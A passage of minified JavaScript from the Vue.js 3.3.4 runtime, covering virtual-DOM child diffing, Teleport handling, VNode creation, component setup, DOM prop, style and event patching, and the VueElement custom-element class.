H=M&&M.children,Y=M?M.shapeFlag:0,B=T.children,{patchFlag:F,shapeFlag:ee}=T;if(F>0){if(F&128){ke(H,B,_,N,P,D,V,U,z);return}else if(F&256){ge(H,B,_,N,P,D,V,U,z);return}}ee&8?(Y&16&&me(H,P,D),B!==H&&m(_,B)):Y&16?ee&16?ke(H,B,_,N,P,D,V,U,z):me(H,P,D,!0):(Y&8&&m(_,""),ee&16&&A(B,_,N,P,D,V,U,z))},ge=(M,T,_,N,P,D,V,U,z)=>{M=M||EMPTY_ARR,T=T||EMPTY_ARR;const H=M.length,Y=T.length,B=Math.min(H,Y);let F;for(F=0;F<B;F++){const ee=T[F]=z?cloneIfMounted(T[F]):normalizeVNode(T[F]);E(M[F],ee,_,null,P,D,V,U,z)}H>Y?me(M,P,D,!0,!1,B):A(T,_,N,P,D,V,U,z,B)},ke=(M,T,_,N,P,D,V,U,z)=>{let H=0;const Y=T.length;let B=M.length-1,F=Y-1;for(;H<=B&&H<=F;){const ee=M[H],te=T[H]=z?cloneIfMounted(T[H]):normalizeVNode(T[H]);if(isSameVNodeType(ee,te))E(ee,te,_,null,P,D,V,U,z);else break;H++}for(;H<=B&&H<=F;){const ee=M[B],te=T[F]=z?cloneIfMounted(T[F]):normalizeVNode(T[F]);if(isSameVNodeType(ee,te))E(ee,te,_,null,P,D,V,U,z);else break;B--,F--}if(H>B){if(H<=F){const ee=F+1,te=ee<Y?T[ee].el:N;for(;H<=F;)E(null,T[H]=z?cloneIfMounted(T[H]):normalizeVNode(T[H]),_,te,P,D,V,U,z),H++}}else if(H>F)for(;H<=B;)he(M[H],P,D,!0),H++;else{const ee=H,te=H,re=new Map;for(H=te;H<=F;H++){const pe=T[H]=z?cloneIfMounted(T[H]):normalizeVNode(T[H]);pe.key!=null&&re.set(pe.key,H)}let ae,ie=0;const ce=F-te+1;let ve=!1,Ee=0;const be=new Array(ce);for(H=0;H<ce;H++)be[H]=0;for(H=ee;H<=B;H++){const pe=M[H];if(ie>=ce){he(pe,P,D,!0);continue}let _e;if(pe.key!=null)_e=re.get(pe.key);else for(ae=te;ae<=F;ae++)if(be[ae-te]===0&&isSameVNodeType(pe,T[ae])){_e=ae;break}_e===void 0?he(pe,P,D,!0):(be[_e-te]=H+1,_e>=Ee?Ee=_e:ve=!0,E(pe,T[_e],_,null,P,D,V,U,z),ie++)}const Se=ve?getSequence(be):EMPTY_ARR;for(ae=Se.length-1,H=ce-1;H>=0;H--){const pe=te+H,_e=T[pe],ue=pe+1<Y?T[pe+1].el:N;be[H]===0?E(null,_e,_,ue,P,D,V,U,z):ve&&(ae<0||H!==Se[ae]?ye(_e,_,ue,2):ae--)}}},ye=(M,T,_,N,P=null)=>{const{el:D,type:V,transition:U,children:z,shapeFlag:H}=M;if(H&6){ye(M.component.subTree,T,_,N);return}if(H&128){M.suspense.move(T,_,N);return}if(H&64){V.move(M,T,_,Z);return}if(V===Fragment){s(D,T,_);for(let B=0;B<z.length;B++)ye(z[B],T,_,N);s(M.anchor,T,_);return}if(V===Static){C(M,T,_);return}if(N!==2&&H&1&&U)if(N===0)U.beforeEnter(D),s(D,T,_),queuePostRenderEffect(()=>U.enter(D),P);else{const{leave:B,delayLeave:F,afterLeave:ee}=U,te=()=>s(D,T,_),re=()=>{B(D,()=>{te(),ee&&ee()})};F?F(D,te,re):re()}else s(D,T,_)},he=(M,T,_,N=!1,P=!1)=>{const{type:D,props:V,ref:U,children:z,dynamicChildren:H,shapeFlag:Y,patchFlag:B,dirs:F}=M;if(U!=null&&setRef(U,null,_,M,!0),Y&256){T.ctx.deactivate(M);return}const ee=Y&1&&F,te=!isAsyncWrapper(M);let re;if(te&&(re=V&&V.onVnodeBeforeUnmount)&&invokeVNodeHook(re,T,M),Y&6)$e(M.component,_,N);else{if(Y&128){M.suspense.unmount(_,N);return}ee&&invokeDirectiveHook(M,null,T,"beforeUnmount"),Y&64?M.type.remove(M,T,_,P,Z,N):H&&(D!==Fragment||B>0&&B&64)?me(H,T,_,!1,!0):(D===Fragment&&B&384||!P&&Y&16)&&me(z,T,_),N&&Ce(M)}(te&&(re=V&&V.onVnodeUnmounted)||ee)&&queuePostRenderEffect(()=>{re&&invokeVNodeHook(re,T,M),ee&&invokeDirectiveHook(M,null,T,"unmounted")},_)},Ce=M=>{const{type:T,el:_,anchor:N,transition:P}=M;if(T===Fragment){we(_,N);return}if(T===Static){R(M);return}const D=()=>{r(_),P&&!P.persisted&&P.afterLeave&&P.afterLeave()};if(M.shapeFlag&1&&P&&!P.persisted){const{leave:V,delayLeave:U}=P,z=()=>V(_,D);U?U(M.el,D,z):z()}else D()},we=(M,T)=>{let _;for(;M!==T;)_=y(M),r(M),M=_;r(T)},$e=(M,T,_)=>{const{bum:N,scope:P,update:D,subTree:V,um:U}=M;N&&invokeArrayFns(N),P.stop(),D&&(D.active=!1,he(V,M,T,_)),U&&queuePostRenderEffect(U,T),queuePostRenderEffect(()=>{M.isUnmounted=!0},T),T&&T.pendingBranch&&!T.isUnmounted&&M.asyncDep&&!M.asyncResolved&&M.suspenseId===T.pendingId&&(T.deps--,T.deps===0&&T.resolve())},me=(M,T,_,N=!1,P=!1,D=0)=>{for(let V=D;V<M.length;V++)he(M[V],T,_,N,P)},W=M=>M.shapeFlag&6?W(M.component.subTree):M.shapeFlag&128?M.suspense.next():y(M.anchor||M.el),Q=(M,T,_)=>{M==null?T._vnode&&he(T._vnode,null,null,!0):E(T._vnode||null,M,T,null,null,null,_),flushPreFlushCbs(),flushPostFlushCbs(),T._vnode=M},Z={p:E,um:he,m:ye,r:Ce,mt:K,mc:A,pc:oe,pbc:G,n:W,o:e};let ne,fe;return t&&([ne,fe]=t(Z)),{render:Q,hydrate:ne,createApp:createAppAPI(Q,ne)}}function toggleRecurse({effect:e,update:t},n){e.allowRecurse=t.allowRecurse=n}function traverseStaticChildren(e,t,n=!1){const s=e.children,r=t.children;if(isArray$2(s)&&isArray$2(r))for(let o=0;o<s.length;o++){const l=s[o];let d=r[o];d.shapeFlag&1&&!d.dynamicChildren&&((d.patchFlag<=0||d.patchFlag===32)&&(d=r[o]=cloneIfMounted(r[o]),d.el=l.el),n||traverseStaticChildren(l,d)),d.type===Text&&(d.el=l.el)}}function getSequence(e){const t=e.slice(),n=[0];let s,r,o,l,d;const u=e.length;for(s=0;s<u;s++){const f=e[s];if(f!==0){if(r=n[n.length-1],e[r]<f){t[s]=r,n.push(s);continue}for(o=0,l=n.length-1;o<l;)d=o+l>>1,e[n[d]]<f?o=d+1:l=d;f<e[n[o]]&&(o>0&&(t[s]=n[o-1]),n[o]=s)}}for(o=n.length,l=n[o-1];o-- >0;)n[o]=l,l=t[l];return n}const isTeleport=e=>e.__isTeleport,isTeleportDisabled=e=>e&&(e.disabled||e.disabled===""),isTargetSVG=e=>typeof SVGElement<"u"&&e instanceof SVGElement,resolveTarget=(e,t)=>{const n=e&&e.to;return isString$2(n)?t?t(n):null:n},TeleportImpl={__isTeleport:!0,process(e,t,n,s,r,o,l,d,u,f){const{mc:m,pc:g,pbc:y,o:{insert:v,querySelector:x,createText:E,createComment:S}}=f,w=isTeleportDisabled(t.props);let{shapeFlag:k,children:C,dynamicChildren:R}=t;if(e==null){const L=t.el=E(""),O=t.anchor=E("");v(L,n,s),v(O,n,s);const I=t.target=resolveTarget(t.props,x),A=t.targetAnchor=E("");I&&(v(A,I),l=l||isTargetSVG(I));const j=(G,X)=>{k&16&&m(C,G,X,r,o,l,d,u)};w?j(n,O):I&&j(I,A)}else{t.el=e.el;const L=t.anchor=e.anchor,O=t.target=e.target,I=t.targetAnchor=e.targetAnchor,A=isTeleportDisabled(e.props),j=A?n:O,G=A?L:I;if(l=l||isTargetSVG(O),R?(y(e.dynamicChildren,R,j,r,o,l,d),traverseStaticChildren(e,t,!0)):u||g(e,t,j,G,r,o,l,d,!1),w)A||moveTeleport(t,n,L,f,1);else if((t.props&&t.props.to)!==(e.props&&e.props.to)){const X=t.target=resolveTarget(t.props,x);X&&moveTeleport(t,X,null,f,0)}else A&&moveTeleport(t,O,I,f,1)}updateCssVars(t)},remove(e,t,n,s,{um:r,o:{remove:o}},l){const{shapeFlag:d,children:u,anchor:f,targetAnchor:m,target:g,props:y}=e;if(g&&o(m),(l||!isTeleportDisabled(y))&&(o(f),d&16))for(let v=0;v<u.length;v++){const x=u[v];r(x,t,n,!0,!!x.dynamicChildren)}},move:moveTeleport,hydrate:hydrateTeleport};function moveTeleport(e,t,n,{o:{insert:s},m:r},o=2){o===0&&s(e.targetAnchor,t,n);const{el:l,anchor:d,shapeFlag:u,children:f,props:m}=e,g=o===2;if(g&&s(l,t,n),(!g||isTeleportDisabled(m))&&u&16)for(let y=0;y<f.length;y++)r(f[y],t,n,2);g&&s(d,t,n)}function hydrateTeleport(e,t,n,s,r,o,{o:{nextSibling:l,parentNode:d,querySelector:u}},f){const m=t.target=resolveTarget(t.props,u);if(m){const g=m._lpa||m.firstChild;if(t.shapeFlag&16)if(isTeleportDisabled(t.props))t.anchor=f(l(e),t,d(e),n,s,r,o),t.targetAnchor=g;else{t.anchor=l(e);let y=g;for(;y;)if(y=l(y),y&&y.nodeType===8&&y.data==="teleport anchor"){t.targetAnchor=y,m._lpa=t.targetAnchor&&l(t.targetAnchor);break}f(g,t,m,n,s,r,o)}updateCssVars(t)}return t.anchor&&l(t.anchor)}const Teleport=TeleportImpl;function updateCssVars(e){const t=e.ctx;if(t&&t.ut){let n=e.children[0].el;for(;n!==e.targetAnchor;)n.nodeType===1&&n.setAttribute("data-v-owner",t.uid),n=n.nextSibling;t.ut()}}const Fragment=Symbol.for("v-fgt"),Text=Symbol.for("v-txt"),Comment=Symbol.for("v-cmt"),Static=Symbol.for("v-stc"),blockStack=[];let currentBlock=null;function openBlock(e=!1){blockStack.push(currentBlock=e?null:[])}function closeBlock(){blockStack.pop(),currentBlock=blockStack[blockStack.length-1]||null}let isBlockTreeEnabled=1;function setBlockTracking(e){isBlockTreeEnabled+=e}function setupBlock(e){return e.dynamicChildren=isBlockTreeEnabled>0?currentBlock||EMPTY_ARR:null,closeBlock(),isBlockTreeEnabled>0&&currentBlock&&currentBlock.push(e),e}function createElementBlock(e,t,n,s,r,o){return setupBlock(createBaseVNode(e,t,n,s,r,o,!0))}function createBlock(e,t,n,s,r){return setupBlock(createVNode(e,t,n,s,r,!0))}function isVNode$1(e){return e?e.__v_isVNode===!0:!1}function isSameVNodeType(e,t){return e.type===t.type&&e.key===t.key}function transformVNodeArgs(e){}const InternalObjectKey="__vInternal",normalizeKey=({key:e})=>e??null,normalizeRef=({ref:e,ref_key:t,ref_for:n})=>(typeof e=="number"&&(e=""+e),e!=null?isString$2(e)||isRef(e)||isFunction$1(e)?{i:currentRenderingInstance,r:e,k:t,f:!!n}:e:null);function createBaseVNode(e,t=null,n=null,s=0,r=null,o=e===Fragment?0:1,l=!1,d=!1){const u={__v_isVNode:!0,__v_skip:!0,type:e,props:t,key:t&&normalizeKey(t),ref:t&&normalizeRef(t),scopeId:currentScopeId,slotScopeIds:null,children:n,component:null,suspense:null,ssContent:null,ssFallback:null,dirs:null,transition:null,el:null,anchor:null,target:null,targetAnchor:null,staticCount:0,shapeFlag:o,patchFlag:s,dynamicProps:r,dynamicChildren:null,appContext:null,ctx:currentRenderingInstance};return d?(normalizeChildren(u,n),o&128&&e.normalize(u)):n&&(u.shapeFlag|=isString$2(n)?8:16),isBlockTreeEnabled>0&&!l&&currentBlock&&(u.patchFlag>0||o&6)&&u.patchFlag!==32&&currentBlock.push(u),u}const createVNode=_createVNode;function _createVNode(e,t=null,n=null,s=0,r=null,o=!1){if((!e||e===NULL_DYNAMIC_COMPONENT)&&(e=Comment),isVNode$1(e)){const d=cloneVNode(e,t,!0);return n&&normalizeChildren(d,n),isBlockTreeEnabled>0&&!o&&currentBlock&&(d.shapeFlag&6?currentBlock[currentBlock.indexOf(e)]=d:currentBlock.push(d)),d.patchFlag|=-2,d}if(isClassComponent(e)&&(e=e.__vccOpts),t){t=guardReactiveProps(t);let{class:d,style:u}=t;d&&!isString$2(d)&&(t.class=normalizeClass(d)),isObject$2(u)&&(isProxy(u)&&!isArray$2(u)&&(u=extend({},u)),t.style=normalizeStyle(u))}const l=isString$2(e)?1:isSuspense(e)?128:isTeleport(e)?64:isObject$2(e)?4:isFunction$1(e)?2:0;return createBaseVNode(e,t,n,s,r,l,o,!0)}function guardReactiveProps(e){return e?isProxy(e)||InternalObjectKey in e?extend({},e):e:null}function cloneVNode(e,t,n=!1){const{props:s,ref:r,patchFlag:o,children:l}=e,d=t?mergeProps(s||{},t):s;return{__v_isVNode:!0,__v_skip:!0,type:e.type,props:d,key:d&&normalizeKey(d),ref:t&&t.ref?n&&r?isArray$2(r)?r.concat(normalizeRef(t)):[r,normalizeRef(t)]:normalizeRef(t):r,scopeId:e.scopeId,slotScopeIds:e.slotScopeIds,children:l,target:e.target,targetAnchor:e.targetAnchor,staticCount:e.staticCount,shapeFlag:e.shapeFlag,patchFlag:t&&e.type!==Fragment?o===-1?16:o|16:o,dynamicProps:e.dynamicProps,dynamicChildren:e.dynamicChildren,appContext:e.appContext,dirs:e.dirs,transition:e.transition,component:e.component,suspense:e.suspense,ssContent:e.ssContent&&cloneVNode(e.ssContent),ssFallback:e.ssFallback&&cloneVNode(e.ssFallback),el:e.el,anchor:e.anchor,ctx:e.ctx,ce:e.ce}}function createTextVNode(e=" ",t=0){return createVNode(Text,null,e,t)}function createStaticVNode(e,t){const n=createVNode(Static,null,e);return n.staticCount=t,n}function createCommentVNode(e="",t=!1){return t?(openBlock(),createBlock(Comment,null,e)):createVNode(Comment,null,e)}function normalizeVNode(e){return e==null||typeof e=="boolean"?createVNode(Comment):isArray$2(e)?createVNode(Fragment,null,e.slice()):typeof e=="object"?cloneIfMounted(e):createVNode(Text,null,String(e))}function cloneIfMounted(e){return e.el===null&&e.patchFlag!==-1||e.memo?e:cloneVNode(e)}function normalizeChildren(e,t){let n=0;const{shapeFlag:s}=e;if(t==null)t=null;else if(isArray$2(t))n=16;else if(typeof t=="object")if(s&65){const r=t.default;r&&(r._c&&(r._d=!1),normalizeChildren(e,r()),r._c&&(r._d=!0));return}else{n=32;const r=t._;!r&&!(InternalObjectKey in t)?t._ctx=currentRenderingInstance:r===3&&currentRenderingInstance&&(currentRenderingInstance.slots._===1?t._=1:(t._=2,e.patchFlag|=1024))}else isFunction$1(t)?(t={default:t,_ctx:currentRenderingInstance},n=32):(t=String(t),s&64?(n=16,t=[createTextVNode(t)]):n=8);e.children=t,e.shapeFlag|=n}function mergeProps(...e){const t={};for(let n=0;n<e.length;n++){const s=e[n];for(const r in s)if(r==="class")t.class!==s.class&&(t.class=normalizeClass([t.class,s.class]));else if(r==="style")t.style=normalizeStyle([t.style,s.style]);else if(isOn(r)){const o=t[r],l=s[r];l&&o!==l&&!(isArray$2(o)&&o.includes(l))&&(t[r]=o?[].concat(o,l):l)}else r!==""&&(t[r]=s[r])}return t}function invokeVNodeHook(e,t,n,s=null){callWithAsyncErrorHandling(e,t,7,[n,s])}const emptyAppContext=createAppContext();let uid=0;function createComponentInstance(e,t,n){const s=e.type,r=(t?t.appContext:e.appContext)||emptyAppContext,o={uid:uid++,vnode:e,type:s,parent:t,appContext:r,root:null,next:null,subTree:null,effect:null,update:null,scope:new EffectScope(!0),render:null,proxy:null,exposed:null,exposeProxy:null,withProxy:null,provides:t?t.provides:Object.create(r.provides),accessCache:null,renderCache:[],components:null,directives:null,propsOptions:normalizePropsOptions(s,r),emitsOptions:normalizeEmitsOptions(s,r),emit:null,emitted:null,propsDefaults:EMPTY_OBJ,inheritAttrs:s.inheritAttrs,ctx:EMPTY_OBJ,data:EMPTY_OBJ,props:EMPTY_OBJ,attrs:EMPTY_OBJ,slots:EMPTY_OBJ,refs:EMPTY_OBJ,setupState:EMPTY_OBJ,setupContext:null,attrsProxy:null,slotsProxy:null,suspense:n,suspenseId:n?n.pendingId:0,asyncDep:null,asyncResolved:!1,isMounted:!1,isUnmounted:!1,isDeactivated:!1,bc:null,c:null,bm:null,m:null,bu:null,u:null,um:null,bum:null,da:null,a:null,rtg:null,rtc:null,ec:null,sp:null};return o.ctx={_:o},o.root=t?t.root:o,o.emit=emit.bind(null,o),e.ce&&e.ce(o),o}let currentInstance=null;const getCurrentInstance=()=>currentInstance||currentRenderingInstance;let internalSetCurrentInstance,globalCurrentInstanceSetters,settersKey="__VUE_INSTANCE_SETTERS__";(globalCurrentInstanceSetters=getGlobalThis$1()[settersKey])||(globalCurrentInstanceSetters=getGlobalThis$1()[settersKey]=[]),globalCurrentInstanceSetters.push(e=>currentInstance=e),internalSetCurrentInstance=e=>{globalCurrentInstanceSetters.length>1?globalCurrentInstanceSetters.forEach(t=>t(e)):globalCurrentInstanceSetters[0](e)};const setCurrentInstance=e=>{internalSetCurrentInstance(e),e.scope.on()},unsetCurrentInstance=()=>{currentInstance&&currentInstance.scope.off(),internalSetCurrentInstance(null)};function isStatefulComponent(e){return e.vnode.shapeFlag&4}let isInSSRComponentSetup=!1;function setupComponent(e,t=!1){isInSSRComponentSetup=t;const{props:n,children:s}=e.vnode,r=isStatefulComponent(e);initProps(e,n,r,t),initSlots(e,s);const o=r?setupStatefulComponent(e,t):void 0;return isInSSRComponentSetup=!1,o}function setupStatefulComponent(e,t){const n=e.type;e.accessCache=Object.create(null),e.proxy=markRaw(new Proxy(e.ctx,PublicInstanceProxyHandlers));const{setup:s}=n;if(s){const r=e.setupContext=s.length>1?createSetupContext(e):null;setCurrentInstance(e),pauseTracking();const o=callWithErrorHandling(s,e,0,[e.props,r]);if(resetTracking(),unsetCurrentInstance(),isPromise(o)){if(o.then(unsetCurrentInstance,unsetCurrentInstance),t)return o.then(l=>{handleSetupResult(e,l,t)}).catch(l=>{handleError(l,e,0)});e.asyncDep=o}else handleSetupResult(e,o,t)}else finishComponentSetup(e,t)}function handleSetupResult(e,t,n){isFunction$1(t)?e.type.__ssrInlineRender?e.ssrRender=t:e.render=t:isObject$2(t)&&(e.setupState=proxyRefs(t)),finishComponentSetup(e,n)}let compile$2,installWithProxy;function registerRuntimeCompiler(e){compile$2=e,installWithProxy=t=>{t.render._rc&&(t.withProxy=new Proxy(t.ctx,RuntimeCompiledPublicInstanceProxyHandlers))}}const isRuntimeOnly=()=>!compile$2;function finishComponentSetup(e,t,n){const s=e.type;if(!e.render){if(!t&&compile$2&&!s.render){const r=s.template||resolveMergedOptions(e).template;if(r){const{isCustomElement:o,compilerOptions:l}=e.appContext.config,{delimiters:d,compilerOptions:u}=s,f=extend(extend({isCustomElement:o,delimiters:d},l),u);s.render=compile$2(r,f)}}e.render=s.render||NOOP,installWithProxy&&installWithProxy(e)}setCurrentInstance(e),pauseTracking(),applyOptions(e),resetTracking(),unsetCurrentInstance()}function getAttrsProxy(e){return e.attrsProxy||(e.attrsProxy=new Proxy(e.attrs,{get(t,n){return track(e,"get","$attrs"),t[n]}}))}function createSetupContext(e){const t=n=>{e.exposed=n||{}};return{get attrs(){return getAttrsProxy(e)},slots:e.slots,emit:e.emit,expose:t}}function getExposeProxy(e){if(e.exposed)return e.exposeProxy||(e.exposeProxy=new Proxy(proxyRefs(markRaw(e.exposed)),{get(t,n){if(n in t)return t[n];if(n in publicPropertiesMap)return publicPropertiesMap[n](e)},has(t,n){return n in t||n in publicPropertiesMap}}))}function getComponentName(e,t=!0){return isFunction$1(e)?e.displayName||e.name:e.name||t&&e.__name}function isClassComponent(e){return isFunction$1(e)&&"__vccOpts"in e}const computed=(e,t)=>computed$1(e,t,isInSSRComponentSetup);function h(e,t,n){const s=arguments.length;return s===2?isObject$2(t)&&!isArray$2(t)?isVNode$1(t)?createVNode(e,null,[t]):createVNode(e,t):createVNode(e,null,t):(s>3?n=Array.prototype.slice.call(arguments,2):s===3&&isVNode$1(n)&&(n=[n]),createVNode(e,t,n))}const ssrContextKey=Symbol.for("v-scx"),useSSRContext=()=>inject(ssrContextKey);function initCustomFormatter(){}function withMemo(e,t,n,s){const r=n[s];if(r&&isMemoSame(r,e))return r;const o=t();return o.memo=e.slice(),n[s]=o}function isMemoSame(e,t){const n=e.memo;if(n.length!=t.length)return!1;for(let s=0;s<n.length;s++)if(hasChanged(n[s],t[s]))return!1;return isBlockTreeEnabled>0&&currentBlock&&currentBlock.push(e),!0}const version="3.3.4",_ssrUtils={createComponentInstance,setupComponent,renderComponentRoot,setCurrentRenderingInstance,isVNode:isVNode$1,normalizeVNode},ssrUtils=_ssrUtils,resolveFilter=null,compatUtils=null,svgNS="http://www.w3.org/2000/svg",doc=typeof document<"u"?document:null,templateContainer=doc&&doc.createElement("template"),nodeOps={insert:(e,t,n)=>{t.insertBefore(e,n||null)},remove:e=>{const t=e.parentNode;t&&t.removeChild(e)},createElement:(e,t,n,s)=>{const r=t?doc.createElementNS(svgNS,e):doc.createElement(e,n?{is:n}:void 0);return e==="select"&&s&&s.multiple!=null&&r.setAttribute("multiple",s.multiple),r},createText:e=>doc.createTextNode(e),createComment:e=>doc.createComment(e),setText:(e,t)=>{e.nodeValue=t},setElementText:(e,t)=>{e.textContent=t},parentNode:e=>e.parentNode,nextSibling:e=>e.nextSibling,querySelector:e=>doc.querySelector(e),setScopeId(e,t){e.setAttribute(t,"")},insertStaticContent(e,t,n,s,r,o){const l=n?n.previousSibling:t.lastChild;if(r&&(r===o||r.nextSibling))for(;t.insertBefore(r.cloneNode(!0),n),!(r===o||!(r=r.nextSibling)););else{templateContainer.innerHTML=s?`<svg>${e}</svg>`:e;const d=templateContainer.content;if(s){const u=d.firstChild;for(;u.firstChild;)d.appendChild(u.firstChild);d.removeChild(u)}t.insertBefore(d,n)}return[l?l.nextSibling:t.firstChild,n?n.previousSibling:t.lastChild]}};function patchClass(e,t,n){const s=e._vtc;s&&(t=(t?[t,...s]:[...s]).join(" ")),t==null?e.removeAttribute("class"):n?e.setAttribute("class",t):e.className=t}function patchStyle(e,t,n){const s=e.style,r=isString$2(n);if(n&&!r){if(t&&!isString$2(t))for(const o in t)n[o]==null&&setStyle(s,o,"");for(const o in n)setStyle(s,o,n[o])}else{const o=s.display;r?t!==n&&(s.cssText=n):t&&e.removeAttribute("style"),"_vod"in e&&(s.display=o)}}const importantRE=/\s*!important$/;function setStyle(e,t,n){if(isArray$2(n))n.forEach(s=>setStyle(e,t,s));else if(n==null&&(n=""),t.startsWith("--"))e.setProperty(t,n);else{const s=autoPrefix(e,t);importantRE.test(n)?e.setProperty(hyphenate(s),n.replace(importantRE,""),"important"):e[s]=n}}const prefixes=["Webkit","Moz","ms"],prefixCache={};function autoPrefix(e,t){const n=prefixCache[t];if(n)return n;let s=camelize(t);if(s!=="filter"&&s in e)return prefixCache[t]=s;s=capitalize$1(s);for(let r=0;r<prefixes.length;r++){const o=prefixes[r]+s;if(o in e)return prefixCache[t]=o}return t}const xlinkNS="http://www.w3.org/1999/xlink";function patchAttr(e,t,n,s,r){if(s&&t.startsWith("xlink:"))n==null?e.removeAttributeNS(xlinkNS,t.slice(6,t.length)):e.setAttributeNS(xlinkNS,t,n);else{const o=isSpecialBooleanAttr(t);n==null||o&&!includeBooleanAttr(n)?e.removeAttribute(t):e.setAttribute(t,o?"":n)}}function patchDOMProp(e,t,n,s,r,o,l){if(t==="innerHTML"||t==="textContent"){s&&l(s,r,o),e[t]=n??"";return}const d=e.tagName;if(t==="value"&&d!=="PROGRESS"&&!d.includes("-")){e._value=n;const f=d==="OPTION"?e.getAttribute("value"):e.value,m=n??"";f!==m&&(e.value=m),n==null&&e.removeAttribute(t);return}let u=!1;if(n===""||n==null){const f=typeof e[t];f==="boolean"?n=includeBooleanAttr(n):n==null&&f==="string"?(n="",u=!0):f==="number"&&(n=0,u=!0)}try{e[t]=n}catch{}u&&e.removeAttribute(t)}function addEventListener(e,t,n,s){e.addEventListener(t,n,s)}function removeEventListener(e,t,n,s){e.removeEventListener(t,n,s)}function patchEvent(e,t,n,s,r=null){const o=e._vei||(e._vei={}),l=o[t];if(s&&l)l.value=s;else{const[d,u]=parseName(t);if(s){const f=o[t]=createInvoker(s,r);addEventListener(e,d,f,u)}else l&&(removeEventListener(e,d,l,u),o[t]=void 0)}}const optionsModifierRE=/(?:Once|Passive|Capture)$/;function parseName(e){let t;if(optionsModifierRE.test(e)){t={};let s;for(;s=e.match(optionsModifierRE);)e=e.slice(0,e.length-s[0].length),t[s[0].toLowerCase()]=!0}return[e[2]===":"?e.slice(3):hyphenate(e.slice(2)),t]}let cachedNow=0;const p=Promise.resolve(),getNow=()=>cachedNow||(p.then(()=>cachedNow=0),cachedNow=Date.now());function createInvoker(e,t){const n=s=>{if(!s._vts)s._vts=Date.now();else if(s._vts<=n.attached)return;callWithAsyncErrorHandling(patchStopImmediatePropagation(s,n.value),t,5,[s])};return n.value=e,n.attached=getNow(),n}function patchStopImmediatePropagation(e,t){if(isArray$2(t)){const n=e.stopImmediatePropagation;return e.stopImmediatePropagation=()=>{n.call(e),e._stopped=!0},t.map(s=>r=>!r._stopped&&s&&s(r))}else return t}const nativeOnRE=/^on[a-z]/,patchProp=(e,t,n,s,r=!1,o,l,d,u)=>{t==="class"?patchClass(e,s,r):t==="style"?patchStyle(e,n,s):isOn(t)?isModelListener(t)||patchEvent(e,t,n,s,l):(t[0]==="."?(t=t.slice(1),!0):t[0]==="^"?(t=t.slice(1),!1):shouldSetAsProp(e,t,s,r))?patchDOMProp(e,t,s,o,l,d,u):(t==="true-value"?e._trueValue=s:t==="false-value"&&(e._falseValue=s),patchAttr(e,t,s,r))};function shouldSetAsProp(e,t,n,s){return s?!!(t==="innerHTML"||t==="textContent"||t in e&&nativeOnRE.test(t)&&isFunction$1(n)):t==="spellcheck"||t==="draggable"||t==="translate"||t==="form"||t==="list"&&e.tagName==="INPUT"||t==="type"&&e.tagName==="TEXTAREA"||nativeOnRE.test(t)&&isString$2(n)?!1:t in e}function defineCustomElement(e,t){const n=defineComponent(e);class s extends VueElement{constructor(o){super(n,o,t)}}return s.def=n,s}const defineSSRCustomElement=e=>defineCustomElement(e,hydrate),BaseClass=typeof HTMLElement<"u"?HTMLElement:class{};class VueElement extends BaseClass{constructor(t,n={},s){super(),this._def=t,this._props=n,this._instance=null,this._connected=!1,this._resolved=!1,this._numberProps=null,this.shadowRoot&&s?s(this._createVNode(),this.shadowRoot):(this.attachShadow({mode:"open"}),this._def.__asyncLoader||this._resolveProps(this._def))}connectedCallback(){this._connected=!0,this._instance||(this._resolved?this._update():this._resolveDef())}disconnectedCallback(){this._connected=!1,nextTick(()=>{this._connected||(render(null,this.shadowRoot),this._instance=null)})}_resolveDef(){this._resolved=!0;for(let s=0;s<this.attributes.length;s++)this._setAttr(this.attributes[s].name);new MutationObserver(s=>{for(const r of s)this._setAttr(r.attributeName)}).observe(this,{attributes:!0});const t=(s,r=!1)=>{const{props:o,styles:l}=s;let d;if(o&&!isArray$2(o))for(const u in o){const f=o[u];(f===Number||f&&f.type===Number)&&(u in this._props&&(this._props[u]=toNumber(this._props[u])),(d||(d=Object.create(null)))[camelize(u)]=!0)}this._numberProps=d,r&&this._resolveProps(s),this._applyStyles(l),this._update()},n=this._def.__asyncLoader;n?n().then(s=>t(s,!0)):t(this._def)}_resolveProps(t){const{props:n}=t,s=isArray$2(n)?n:Object.keys(n||{});for(const r of Object.keys(this))r[0]!=="_"&&s.includes(r)&&this._setProp(r,this[r],!0,!1);for(const r of s.map(camelize))Object.defineProperty(this,r,{get(){return this._getProp(r)},set(o){this._setProp(r,o)}})}_setAttr(t){let n=this.getAttribute(t);const s=camelize(t);this._numberProps&&this._numberProps[s]&&(n=toNumber(n)),this._setProp(s,n,!1)}_getProp(t){return this._props[t]}_setProp(t,n,s=!0,r=!0){n!==this._props[t]&&(this._props[t]=n,r&&this._instance&&this._update(),s&&(n===!0?this.setAttribute(hyphenate(t),""):typeof n=="string"||typeof n=="number"?this.setAttribute(hyphenate(t),n+""):n||this.removeAttribute(hyphenate(t))))}_update(){render(this._createVNode(),this.shadowRoot)}_createVNode(){const t=createVNode(this._def,extend({},this._props));return this._instance||(t.ce=n=>{this._instance=n,n.isCE=!0;const s=(o,l)=>{this.dispatchEvent(new CustomEvent(o,{detail:l}))};n.emit=(o,...l)=>{s(o,l),hyphenate(o)!==o&&s(hyphenate(o),l)};let r=this;for(;r=r&&(r.parentNode||r.host);)if(r instanceof VueElement){n.parent=r._instance,n.provides=r._instance.provides;break}}),t}_applyStyles(t){t&&t.forEach(n=>{const s=document.createElement("style");s.textContent=n,this.shadowRoot.appendChild(s)})}}function useCssModule(e="$style"){{const t=getCurrentInstance();if(!t)return EMPTY_OBJ;const n=t.type.__cssModules;if(!n)return EMPTY_OBJ;const s=n[e];return s||EMPTY_OBJ}}function useCssVars(e){const t=getCurrentInstance();if(!t)return;const n=t.ut=(r=e(t.proxy))=>{Array.from(document.querySelectorAll(`[data-v-owner="${t.uid}"]`)).forEach(o=>setVarsOnNode(o,r))},s=()=>{const r=e(t.proxy);setVarsOnVNode(t.subTree,r),n(r)};watchPostEffect(s),onMounted(()=>{const r=new MutationObserver(s);r.observe(t.subTree.el.parentNode,{childList:!0}),onUnmounted(()=>r.disconnect())})}function setVarsOnVNode(e,t){if(e.shapeFlag&128){const n=e.suspense;e=n.activeBranch,n.pendingBranch&&!n.isHydrating&&n.effects.push(()=>{setVarsOnVNode(n.activeBranch,t)})}for(;e.component;)e=e.component.subTree;if(e.shapeFlag&1&&e.el)setVarsOnNode(e.el,t);else if(e.type===Fragment)e.children.forEach(n=>setVarsOnVNode(n,t));else if(e.type===Static){let{el:n,anchor:s}=e;for(;n&&(setVarsOnNode(n,t),n!==s);)n=n.nextSibling}}function setVarsOnNode(e,t){if(e.nodeType===1){const n=e.style;for(const s in 